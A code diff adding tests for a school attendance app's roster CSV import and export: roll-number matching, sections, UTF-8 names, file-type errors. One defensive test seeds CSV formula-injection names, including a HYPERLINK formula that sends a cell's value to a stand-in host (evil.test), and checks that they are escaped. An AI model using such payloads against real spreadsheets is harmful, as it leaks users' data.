@@ -382,3 +382,187 @@ test("what she uploads is what the admin attendance table and the Repository sho
     assert.match((await sessionPage(id)).html!, /2 of 3 attended/);
   });
 });
+
+// ── Review findings on this feature (second round) ──────────────────────────
+//
+// Found by independent reviewers of the first version; each test below failed
+// against it. The downloaded roster has to survive a spreadsheet and come back:
+// Excel turns a roll number 01 into 1, a section is the only thing that tells
+// two children of a whole-grade session apart, a Devanagari name needs a BOM to
+// open as itself, and a cell that begins = + - @ must never run.
+
+const learner = (w: TeachingWorld, name: string, roll: string | null, section: string | null, classId = w.five, grade = 5) =>
+  w.f.row("learners", { class_id: classId, school_id: w.school, grade, name, roll_number: roll, section });
+
+test("a roll number Excel has turned from 07 into 7 is still that student", { skip }, async () => {
+  await inWorld(async (w) => {
+    const id = await w.session();
+    const dolma = await learner(w, "Dolma", "07", "A");
+    const sonam = await learner(w, "Sonam", "010", "A");
+    const pema = await learner(w, "Pema", "A-05", "A");
+    as(w.teacherUser, "teacher");
+
+    // Name and roll as the roster wrote them, after a spreadsheet dropped the zeros; a roll-only row; a roll no spreadsheet touches.
+    const csv = ["student,rollNumber,section,status", "Dolma,7,A,present", ",10,,late", "Pema,A-05,A,absent", "Angmo,1,A,excused"].join("\r\n");
+    const done = await upload(csvForm(csv, { id }));
+    assert.match(done?.ok ?? "", /4 students marked/, JSON.stringify(done));
+    assert.equal(done?.issues?.length ?? 0, 0, JSON.stringify(done?.issues));
+    assert.deepEqual(await marksOf(w.c, id), { [dolma]: "present", [sonam]: "late", [pema]: "absent", [w.angmo]: "excused" });
+
+    // A class that holds both 1 and 01: a spreadsheet cannot say which one "1" was, so a roll-only row is reported, never guessed;
+    // the name settles it.
+    const one = await learner(w, "Zhaxi", "01", "A");
+    const both = await upload(csvForm("student,rollNumber,status\n,1,absent\nZhaxi,1,late\n", { id }));
+    assert.match(both?.ok ?? "", /1 student marked/, JSON.stringify(both));
+    assert.match(both?.issues?.[0] ?? "", /^Line 2: roll 1 matches 2 students \(roll (1, roll 01|01, roll 1)\)/, both?.issues?.[0]);
+    const marks = await marksOf(w.c, id);
+    assert.equal(marks[one], "late");
+    assert.equal(marks[w.angmo], "excused", "Angmo keeps the mark she had: the ambiguous row marked nobody");
+  });
+});
+
+test("on a whole-grade session the section column tells children with one roll apart", { skip }, async () => {
+  await inWorld(async (w) => {
+    const anu = await learner(w, "Anu", "1", "A", w.six, 6);
+    const ben = await learner(w, "Ben", "1", "B", w.six, 6);
+    const tenzinA = await learner(w, "Tenzin", "2", "A", w.six, 6);
+    const tenzinB = await learner(w, "Tenzin", "2", "B", w.six, 6);
+    const id = await w.session({ class_id: w.six, section: null });
+    as(w.teacherUser, "teacher");
+
+    // Roll numbers restart in every section: the roll and the section together are the child.
+    const done = await upload(csvForm("rollNumber,section,status\n1,A,present\n1,b,absent\n2,A,late\n2,B,excused\n", { id }));
+    assert.match(done?.ok ?? "", /4 students marked/, JSON.stringify(done));
+    assert.deepEqual(await marksOf(w.c, id), { [anu]: "present", [ben]: "absent", [tenzinA]: "late", [tenzinB]: "excused" });
+
+    // The roster as downloaded, with only the status filled in, comes back whole.
+    const { data } = Papa.parse<string[]>((await (await rosterRoute(id)).text()).trim(), { skipEmptyLines: true });
+    assert.deepEqual(data.slice(1).map((r) => r.join(",")).sort(), ["Anu,1,A,", "Ben,1,B,", "Tenzin,2,A,", "Tenzin,2,B,"]);
+    const filled = data.map((row, i) => (i === 0 ? row : [...row.slice(0, 3), "absent"]));
+    const again = await upload(csvForm(filled.map((r) => r.join(",")).join("\r\n"), { id }));
+    assert.match(again?.ok ?? "", /4 students marked/, JSON.stringify(again));
+    assert.deepEqual(Object.values(await marksOf(w.c, id)), ["absent", "absent", "absent", "absent"]);
+
+    // Without the section the file cannot choose; the message names the sections, and does not ask for a column it has.
+    const lost = await upload(csvForm("student,rollNumber,section,status\nTenzin,2,,present\n,1,,present\n", { id }));
+    assert.match(lost?.error ?? "", /No rows were imported/);
+    assert.match(lost?.issues?.[0] ?? "", /^Line 2: Tenzin matches 2 students \(roll 2, section A; roll 2, section B\)\. .*section column/, lost?.issues?.[0]);
+    assert.match(lost?.issues?.[1] ?? "", /^Line 3: roll 1 matches 2 students \(roll 1, section A; roll 1, section B\)\. .*section column/);
+  });
+});
+
+test("two children who cannot be told apart in a file are sent to the page, not to a column that cannot help", { skip }, async () => {
+  await inWorld(async (w) => {
+    const id = await w.session();
+    await learner(w, "Nima", null, "A");
+    await learner(w, "Nima", null, "A");
+    as(w.teacherUser, "teacher");
+
+    const res = await upload(csvForm("student,rollNumber,status\nNima,,present\nTashi,,present\n", { id }));
+    const nima = (res?.issues ?? []).find((i) => i.startsWith("Line 2:")) ?? "";
+    assert.match(nima, /Nima matches 2 students \(no roll number, no roll number\)/);
+    assert.match(nima, /roll numbers under My students, or mark them on the session page/);
+    assert.doesNotMatch(nima, /Add a rollNumber column/);
+    // Two Tashis who do have roll numbers are still told to give one.
+    assert.match((res?.issues ?? []).find((i) => i.startsWith("Line 3:")) ?? "", /Tashi matches 2 students \(roll 5, roll 6\)\. .*roll number/);
+  });
+});
+
+test("a name and a roll number that disagree say which one does not fit", { skip }, async () => {
+  await inWorld(async (w) => {
+    const id = await w.session();
+    as(w.teacherUser, "teacher");
+
+    const res = await upload(csvForm("student,rollNumber,status\nBilal,9,present\nTashi Doma,6,present\nAngmo,2,present\nNobody,9,present\n", { id }));
+    const at = (line: number) => (res?.issues ?? []).find((i) => i.startsWith(`Line ${line}:`)) ?? "";
+    assert.match(at(2), /Bilal \(roll 9\) does not match the roster: Bilal has roll 2\./);
+    assert.match(at(3), /Tashi Doma \(roll 6\) does not match the roster: roll 6 is Tashi\./);
+    assert.match(at(4), /Angmo \(roll 2\) is not on this session's roster/, "two different students: the plain answer");
+    assert.match(at(5), /Nobody \(roll 9\) is not on this session's roster/);
+    assert.deepEqual(await marksOf(w.c, id), {});
+  });
+});
+
+test("the roster opens in Excel as UTF-8, and Devanagari and Tibetan names come back as themselves", { skip }, async () => {
+  await inWorld(async (w) => {
+    const id = await w.session();
+    const hindi = await learner(w, "तन्ज़िन डोल्मा", "21", "A");
+    const tibetan = await learner(w, "བསྟན་འཛིན", "22", "A");
+    as(w.teacherUser, "teacher");
+
+    const res = await rosterRoute(id);
+    const bytes = new Uint8Array(await res.arrayBuffer());
+    assert.deepEqual([...bytes.slice(0, 3)], [0xef, 0xbb, 0xbf], "a UTF-8 byte order mark, or Excel reads the names as Windows-1252");
+    const text = new TextDecoder("utf-8", { ignoreBOM: true }).decode(bytes);
+    assert.ok(text.startsWith("﻿student,rollNumber,section,status"));
+
+    const { data } = Papa.parse<string[]>(text.slice(1).trim(), { skipEmptyLines: true });
+    const filled = data.map((row, i) => (i === 0 ? row : [...row.slice(0, 3), "present"]));
+    const done = await upload(csvForm("﻿" + filled.map((r) => r.map((c) => `"${c}"`).join(",")).join("\r\n"), { id }));
+    assert.match(done?.ok ?? "", /7 students marked/, JSON.stringify(done));
+    const marks = await marksOf(w.c, id);
+    assert.equal(marks[hindi], "present");
+    assert.equal(marks[tibetan], "present");
+  });
+});
+
+test("a name with a line break inside cannot run as a formula in the roster she downloads", { skip }, async () => {
+  await inWorld(async (w) => {
+    const id = await w.session();
+    // What Papa's own escapeFormulae misses: a cell whose formula spans lines.
+    const names = ["=1+1\nfoo", "-2\nz", "@SUM(1)\r\nx", "\t=1\nx", `=HYPERLINK("http://evil.test/?"&B2,\n"click")`];
+    for (const [i, name] of names.entries()) await learner(w, name, String(90 + i), "A");
+    as(w.teacherUser, "teacher");
+
+    const body = await (await rosterRoute(id)).text();
+    const { data } = Papa.parse<string[]>(body.trim(), { skipEmptyLines: true });
+    assert.equal(data.length, 1 + 5 + 5);
+    for (const row of data.slice(1)) assert.doesNotMatch(row[0]!, /^[=+\-@\t\r]/, `${JSON.stringify(row[0])} would run as a formula`);
+    assert.equal(data.filter((r) => r[0]!.startsWith("'")).length, 5, "all five came out as text");
+  });
+});
+
+test("a workbook or a UTF-16 file is told to be saved as CSV, not told its columns are missing", { skip }, async () => {
+  await inWorld(async (w) => {
+    const id = await w.session();
+    as(w.teacherUser, "teacher");
+    const xlsx = `PK\u0003\u0004${"\u0000".repeat(40)}[Content_Types].xml`;
+    const utf16 = [..."student,status\nAngmo,present\n"].join("\u0000");
+    for (const [name, content] of [["roster.xlsx", xlsx], ["roster.csv", utf16]] as const) {
+      const err = (await upload(csvForm(content, { id }, name)))?.error ?? "";
+      assert.match(err, /not a plain CSV/, name);
+      assert.match(err, /Save as/, name);
+    }
+    assert.deepEqual(await marksOf(w.c, id), {});
+  });
+});
+
+test("the CSV controls come before the roster, and the file is named for the class and the day", { skip }, async () => {
+  await inWorld(async (w) => {
+    const id = await w.session();
+    const whole = await w.session({ class_id: w.six, section: null, scheduled_date: "2026-10-07" });
+    as(w.teacherUser, "teacher");
+
+    const html = (await sessionPage(id)).html!;
+    const at = (needle: string) => html.indexOf(needle);
+    assert.ok(at("Download roster CSV") > 0 && at('type="radio"') > 0);
+    assert.ok(at("Download roster CSV") < at('type="radio"'), "a class of forty must not have to scroll the whole list to find the upload");
+    assert.ok(at("Upload attendance CSV") < at('type="radio"'));
+
+    assert.match((await rosterRoute(id)).headers.get("content-disposition") ?? "", /filename="attendance-grade5A-2026-10-05\.csv"/);
+    assert.match((await rosterRoute(whole)).headers.get("content-disposition") ?? "", /filename="attendance-grade6-2026-10-07\.csv"/);
+  });
+});
+
+test("a refused Save attendance refreshes the page, so a student added in the meantime shows up", { skip }, async () => {
+  await inWorld(async (w) => {
+    const id = await w.session();
+    as(w.teacherUser, "teacher");
+    const { saveAttendanceAction } = (await import(`${APP}/sessions/actions.ts`)) as { saveAttendanceAction: (p: unknown, fd: FormData) => Promise<State> };
+
+    request.revalidated = [];
+    const refused = await saveAttendanceAction(undefined, form({ id }));
+    assert.match(refused?.error ?? "", /5 students have no attendance mark/);
+    assert.ok((request.revalidated ?? []).includes(`/teaching/sessions/${id}`), "the roster she was looking at is stale: the page is fetched again");
+  });
+});
